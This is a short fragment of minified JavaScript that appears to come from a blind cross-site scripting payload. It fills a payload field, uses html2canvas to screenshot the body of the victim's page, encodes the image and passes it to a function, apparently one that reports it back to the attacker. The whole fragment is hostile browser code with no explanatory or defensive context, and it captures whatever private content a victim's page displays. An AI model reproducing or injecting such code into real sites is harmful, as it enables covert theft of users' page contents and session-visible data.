...
try{ez_rD.payload="{%data payload}"}catch(e){ez_rD.payload=""}try{html2canvas(document.body).then(function(e){console.log(e);ez_rD.screenshot=ez_n(e.toDataURL()),ez_c();});}catch(e){console.log(e);ez_rD.screenshot="",ez_c()}
